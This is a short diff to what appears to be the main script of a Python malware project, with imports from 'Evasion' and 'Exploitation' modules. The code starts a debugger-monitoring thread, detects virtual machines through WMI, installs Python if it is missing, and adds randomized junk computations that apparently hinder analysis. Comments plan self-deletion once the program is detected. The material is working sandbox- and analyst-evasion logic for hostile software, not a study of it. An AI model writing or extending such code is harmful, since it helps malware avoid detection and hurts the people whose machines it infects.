@@ -6,6 +6,8 @@ from threading import Thread
 from Evasion import debugEvasion,vmDetect
 from Evasion.utils import is_normal_browser_user,get_idle_duration,prevent_sleep,turn_screen_off
 from Exploitation.common import abuse_open_ports
+from Evasion.Randomize import random_base64,random_byte,random_list,random_a85
+from random import randrange,choice
 #//TODO: instead of sys.exit. spawn subprocess to delete the whole thing before.
 def main():
     Thread(target=debugEvasion.process_monitor,args=()).start()
@@ -35,6 +37,12 @@ def main():
     if vmDetect.detect_vm_by_wmi():
         vm_flag("detected vm by wmi") #another vm evade
         #we do the detect_vm as last check as this is noisy AF
+    ALLOC_RANDOM = randrange(1 , 10)
+    if ALLOC_RANDOM > 6:
+        x = choice([random_base64,random_byte,random_a85,random_list])()
+        #we have chance of 30% to get here, and if we get here, we choose from 4 functions
+        # each of this functions have 50% chance to return something else.
+        #random it is.
     if not is_python_exist():
         install_python()
 
